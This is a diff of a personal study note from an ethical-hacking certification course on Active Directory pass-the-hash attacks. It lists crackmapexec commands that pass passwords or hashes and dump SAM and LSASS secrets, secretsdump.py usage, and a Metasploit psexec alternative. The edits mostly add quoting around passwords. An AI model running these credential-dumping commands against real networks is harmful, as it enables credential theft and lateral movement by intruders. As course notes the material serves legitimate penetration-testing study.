@@ -3,7 +3,7 @@
 
 **Commands**:
 - crackmapexec:
-    - for pw: `crackmapexec smb <IP/CIDR> -u <user> -d <domain> -p <pass>`
+    - for pw: `crackmapexec smb <IP/CIDR> -u <user> -d <domain> -p '<pass>'`
     - for hash: 
         - passing hash generic - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth`
         - pass hash and dump SAM data - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth --sam` 
@@ -12,13 +12,13 @@
         - pass hash and dump lsass with lsassy - `crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth -M lsassy` (-M is short for module, and `lsassy` is only one of many modules)
     - `crackmapexec` also has a db containing enum data gathered so far, called `cmedb`
 - secretsdump -
-    - with password: `secretsdump.py ADDOMAINNAME/uname:UserPasswd@TARGIPADDR`
+    - with password: `secretsdump.py ADDOMAINNAME/uname:'UserPasswd'@TARGIPADDR`
     - with hash: `secretsdump.py uname:@TARGIPADDR -hashes LM:NT`
  
 
 *Tools*:
 - `crackmapexec` - Passes the password or the hash, and also gives a readout of what has been pwned (what has been logged into that is a local admin)
-- `secretsdump.py`  - grabs local hashes, see [[Pass the hash#Examples|Examples]] for usage
+- `secretsdump.py`  - grabs local hashes, see [[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/2_Enumeration/Post-Compromise Enumeration/Active Directory/Pass the hash#Examples|Examples]] for usage
     - For `secretsdump`, you Especially want to pay attention to local admin hashes you get, and ESPECIALLY domain admin hashes
         - you will also want to dump secrets from every machine you have access to as a local admin
     - `msf> exploit(windows/smb/psexec)` is an alternative if you would like to use `Metasploit`
